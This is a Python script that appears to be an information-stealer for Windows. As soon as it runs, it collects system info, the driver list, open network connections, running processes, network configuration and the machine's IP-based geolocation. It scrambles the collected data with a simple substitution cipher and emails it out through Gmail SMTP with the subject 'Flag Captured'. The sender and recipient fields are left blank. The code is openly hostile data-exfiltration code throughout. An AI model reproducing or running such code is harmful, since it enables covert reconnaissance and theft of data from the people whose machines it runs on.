import subprocess
import datetime
import time

import json
import requests
import urllib

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Check if the Computer is Connected to the Internet.
# Precondition: None
# Postcondition: Returns the Internet State.
def internet():

    # Connects (True) | Does Not Connect (False)
    try:
        urllib.request.urlopen('https://www.google.com',timeout=1)
        return True
    except Exception as e:
        return False
# Stores the device's basic information.
# Precondition: None
# Postcondition: Returns the device's basic information.
def getInfo():

    # Checks Output (Byte) | Converts to utf-8 (String)
    content = subprocess.check_output("systeminfo").decode("utf-8")
    return content

# Stores the device's hardware information.
# Precondition: None
# Postcondition: Returns the device's hardware information.
def getHardware():

    # Checks Output (Byte) | Converts to utf-8 (String)
    content = subprocess.check_output("driverquery /SI").decode("utf-8")

    return content

# Stores additional information.
# Precondition: None
# Postcondition: Returns additional information.
def getDetails():

    # Open Ports, State (Listening, Established or Closed)
    content1 = subprocess.check_output("netstat -an").decode("utf-8")

    # Provides a current list of all tasks running on your PC.
    content2 = subprocess.check_output("tasklist -v").decode("utf-8")

    # View Your Computer's Network.
    content3 = subprocess.check_output("ipconfig /all").decode("utf-8")

    return content1 + content2 + content3

def getGeolocation():

    # Opens The Url | Reads HTML Text | Decodes Text to String.
    external = urllib.request.urlopen('https://ident.me').read().decode('utf8')

    # Sends Request | Receives Status Code (200) | Converts Data to Text | Need Access Key.
    address = external
    send_url = "http://api.ipstack.com/" + str(address) + "?access_key="
    received = requests.get(send_url)
    dictData = json.loads(received.text)

    # Reformats Device Data.
    stringData = "Location:\n\n"
    stringDictData = ""
    j = 0
    for i in dictData:
        if "location" not in i:
            stringData += i + ": " + str(dictData[i]) + "\n"
        else:
            if j == 0:
                stringData += "\n"
                j += 1
            stringDictData += str(dictData[i])

    # Creates a new list.
    listData = stringDictData.strip().split(",")

    # Reformats Country Data.
    locationString = ""
    for i in listData:
        newList = i.split("'")
        locationString += str(newList[1])
        locationString += str(newList[-1]) + ": "
        value2 = str(newList[3:4])
        locationString += str(value2[2:-2]) + "\n"
    # Returns Geolocation
    return stringData + locationString

# Stores the date and time.
# Precondition: None
# Postcondition: Returns the date and time.
def getDateAndTime():

    # Returns Today's Date && Creates A List.
    todayDate = str(datetime.date.today())
    todayDate = todayDate.split("-")

    # Changes The Date Format.
    temp1 = todayDate[0]
    todayDate.remove(temp1)
    todayDate.append(temp1)

    # List To String.
    date = ""
    i = 0
    while i < len(todayDate):
        date += todayDate[i]
        if i <= 1:
            date += "/"
        i += 1
    # Returns Today's Time && Creates A List.
    moment = str(time.localtime())
    moment = moment.strip().split(",")

    # Changes The Time Format.
    temp = ""
    for i in moment:
        if "hour" in i or "min" in i:
            temp += i

    temp = temp.split(" ")

    # The Final String (Date & Time).
    todayDate = date
    todayTime = temp[1][8:] + ":" + temp[2][7:]
    today = "{} | {}".format(todayDate, todayTime)

    # Return Today
    return today

# Encrypts Data.
# Precondition: A String.
# Postcondition: Returns Encrypted String.
def encrypt(message):

    key = "abcdefghijklmnopqrstuvwxyz~`}{:;?/><.,|!+c)#($*%&^=-ABCDEFGHIJKLMNOPQRSTUVWXYZ6789012345"
    iv = "nopqrstuvwxyzabcdefghijklm!+c)#($*%&^=-~`}{:;?/><.,|SPIDERZABCFGHJKLMNOQTUVWXY1234567890"
    cipher = ""
    user_input = message

    for i in user_input:
        index = key.find(i)
        if index > -1:
            cipher += iv[index]
        else:
            cipher += i

    return cipher

# Sends An Email.
# Precondition: Encrypted String.
# Postcondition: The Email is Sent.
def sendEmail(text):

    # Fake Google Account
    log1 = ""
    log2 = ""
    # SETUP SMTP SERVER | Start && Connects | ###
    session = smtplib.SMTP(host="smtp.gmail.com",port="587")
    session.starttls()
    session.login(log1,log2)

    # Create A Message.
    msg = MIMEMultipart()

    # Assign Message Content.
    message = text

    # Assign The Parameters.
    msg["From"] = log1
    msg["Subject"] = "🚩 Flag Captured "
    
    # Email: ""
    # Pass: ""
    msg["To"] = ""
    
    # Attach Message Body.
    msg.attach(MIMEText(message,"plain"))

    # Send The Message Via The Server.
    session.send_message(msg)

    # Delete MIMEMultipart Function.
    del msg

    # Stop SMTP && Disconnect.
    session.quit()

def line():

    # Format: Line Divider.
    return "_" * 70 + "\n\n"
def run():
    test = internet()
    if test:
        test1 = getInfo()
        test2 = getHardware()
        text3 = getDetails()
        test4 = getGeolocation()
        test5 = getDateAndTime()
        finalTest = test1 + line() + test2 + line() + text3 + line() + test4 + line() + test5
        eText = encrypt(finalTest)
        sendEmail(eText)
        print("Success o-o")
    else:
        print("Abort o-o")
run()
